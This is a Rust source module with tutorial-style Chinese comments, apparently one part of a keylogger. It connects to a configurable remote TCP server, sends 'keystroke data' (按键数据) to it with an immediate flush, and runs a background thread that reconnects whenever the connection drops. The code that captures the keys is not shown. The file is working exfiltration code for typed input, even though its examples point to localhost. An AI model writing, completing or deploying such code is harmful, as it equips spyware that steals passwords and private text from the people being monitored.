// ============================================================================
// 网络传输模块
// ============================================================================
// 本模块负责与远程服务器建立 TCP 连接，并将按键数据发送到服务器
//
// 主要功能：
// 1. 建立 TCP 连接
// 2. 发送数据
// 3. 自动重连机制
//
// 使用方法：
//   let config = NetworkConfig { ... };
//   let transmitter = NetworkTransmitter::new(config);
//   transmitter.connect().unwrap();
//   transmitter.send("hello").unwrap();
// ============================================================================

use std::io::Write; // Write trait，用于写入数据到 TcpStream
use std::net::TcpStream; // TCP 网络流
use std::sync::{Arc, Mutex}; // Arc: 原子引用计数，Mutex: 互斥锁
use std::thread; // 线程模块
use std::time::Duration; // 时间间隔

/// 网络传输配置结构体
///
/// 包含连接服务器所需的所有配置信息
///
/// # 字段说明
/// * `server_ip` - 服务器的 IP 地址（如 "127.0.0.1"）
/// * `server_port` - 服务器的端口号（如 8888）
/// * `reconnect_interval` - 断线重连的间隔时间
#[derive(Clone)] // 允许克隆，因为需要在多个线程间共享配置
pub struct NetworkConfig {
    pub server_ip: String,
    pub server_port: u16,
    pub reconnect_interval: Duration,
}

/// 网络传输器
///
/// 负责管理与远程服务器的 TCP 连接，提供数据发送功能
///
/// # 设计说明
/// * 使用 `Arc<Mutex<Option<TcpStream>>>` 来包装 TCP 连接
///   - `Arc`: 允许在多线程间共享所有权
///   - `Mutex`: 保证同一时间只有一个线程可以访问连接
///   - `Option`: 连接可能不存在（断开时）
///
/// # 示例
/// ```
/// let config = NetworkConfig {
///     server_ip: "127.0.0.1".to_string(),
///     server_port: 8888,
///     reconnect_interval: Duration::from_secs(5),
/// };
/// let transmitter = Arc::new(NetworkTransmitter::new(config));
/// transmitter.connect().unwrap();
/// transmitter.send("hello").unwrap();
/// ```
pub struct NetworkTransmitter {
    /// 网络配置
    config: NetworkConfig,
    /// TCP 连接流
    /// 使用 Arc<Mutex<>> 包装，实现线程安全的共享访问
    stream: Arc<Mutex<Option<TcpStream>>>,
}

impl NetworkTransmitter {
    /// 创建新的网络传输器
    ///
    /// # 参数
    /// * `config` - 网络配置
    ///
    /// # 返回
    /// 返回一个新的 NetworkTransmitter 实例
    ///
    /// # 注意
    /// 创建实例后需要调用 `connect()` 方法建立连接
    pub fn new(config: NetworkConfig) -> Self {
        NetworkTransmitter {
            config,
            stream: Arc::new(Mutex::new(None)), // 初始时没有连接
        }
    }

    /// 连接到服务器
    ///
    /// 尝试建立与远程服务器的 TCP 连接
    ///
    /// # 返回
    /// * `Ok(())` - 连接成功
    /// * `Err(String)` - 连接失败，返回错误信息
    ///
    /// # 错误情况
    /// * 服务器未启动
    /// * 网络不通
    /// * IP 地址或端口错误
    pub fn connect(&self) -> Result<(), String> {
        // 构建服务器地址字符串，格式为 "IP:端口"
        let address = format!("{}:{}", self.config.server_ip, self.config.server_port);

        // 尝试连接服务器
        match TcpStream::connect(&address) {
            Ok(stream) => {
                // 连接成功，设置写入超时
                // 防止发送数据时无限等待
                stream
                    .set_write_timeout(Some(Duration::from_secs(5)))
                    .unwrap();

                // 将连接保存到 stream 字段
                // lock() 获取互斥锁，unwrap() 处理可能的锁中毒
                *self.stream.lock().unwrap() = Some(stream);

                eprintln!("已连接到服务器：{}", address);
                Ok(())
            }
            Err(e) => Err(format!("连接失败：{}", e)),
        }
    }

    /// 发送数据到服务器
    ///
    /// 将按键数据通过 TCP 连接发送到远程服务器
    ///
    /// # 参数
    /// * `data` - 要发送的字符串数据
    ///
    /// # 返回
    /// * `Ok(())` - 发送成功
    /// * `Err(String)` - 发送失败，返回错误信息
    ///
    /// # 错误处理
    /// * 如果发送失败，会自动断开连接
    /// * 后台重连线程会尝试重新连接
    pub fn send(&self, data: &str) -> Result<(), String> {
        // 获取连接的互斥锁
        let mut stream_guard = self.stream.lock().unwrap();

        // 检查连接是否存在
        if let Some(ref mut stream) = *stream_guard {
            // 尝试写入数据
            // write_all 会写入所有数据，如果失败会返回错误
            if let Err(e) = stream.write_all(data.as_bytes()) {
                // 发送失败，断开连接
                // 这样重连线程会尝试重新连接
                *stream_guard = None;
                return Err(format!("发送失败：{}", e));
            }

            // 刷新缓冲区，确保数据立即发送
            // TCP 有缓冲区机制，flush() 强制发送缓冲区中的数据
            if let Err(e) = stream.flush() {
                *stream_guard = None;
                return Err(format!("刷新失败：{}", e));
            }
        } else {
            // 没有连接，返回错误
            return Err("未连接到服务器".to_string());
        }

        Ok(())
    }

    /// 断开与服务器的连接
    ///
    /// 主动断开 TCP 连接
    /// 将 stream 设置为 None 即可断开
    // pub fn disconnect(&self) {
    //     *self.stream.lock().unwrap() = None;
    //     eprintln!("已断开与服务器的连接");
    // }

    /// 启动自动重连线程
    ///
    /// 创建一个后台线程，定期检查连接状态
    /// 如果发现连接断开，会尝试重新连接
    ///
    /// # 工作原理
    /// 1. 后台线程每隔 `reconnect_interval` 时间检查一次
    /// 2. 如果 stream 为 None（连接断开），尝试重新连接
    /// 3. 重连成功后更新 stream
    ///
    /// # 线程安全
    /// 使用 Arc 克隆来在多线程间共享 stream
    pub fn start_reconnect_thread(&self) {
        // 克隆 Arc，这样后台线程可以访问 stream
        let stream = Arc::clone(&self.stream);
        let config = self.config.clone();

        // 创建后台线程
        thread::spawn(move || {
            loop {
                // 等待指定的重连间隔
                thread::sleep(config.reconnect_interval);

                // 检查连接状态
                let stream_guard = stream.lock().unwrap();
                if stream_guard.is_none() {
                    // 连接不存在，尝试重连
                    // 先释放锁，否则在 connect 时会死锁
                    drop(stream_guard);

                    // 构建服务器地址
                    let address = format!("{}:{}", config.server_ip, config.server_port);

                    // 尝试连接
                    match TcpStream::connect(&address) {
                        Ok(s) => {
                            // 重连成功
                            s.set_write_timeout(Some(Duration::from_secs(5))).unwrap();
                            *stream.lock().unwrap() = Some(s);
                            eprintln!("重连成功：{}", address);
                        }
                        Err(e) => {
                            // 重连失败，等待下次尝试
                            eprintln!(
                                "重连失败：{}，将在 {} 秒后重试",
                                e,
                                config.reconnect_interval.as_secs()
                            );
                        }
                    }
                }
                // 如果连接存在，什么都不做，继续等待
            }
        });
    }
}
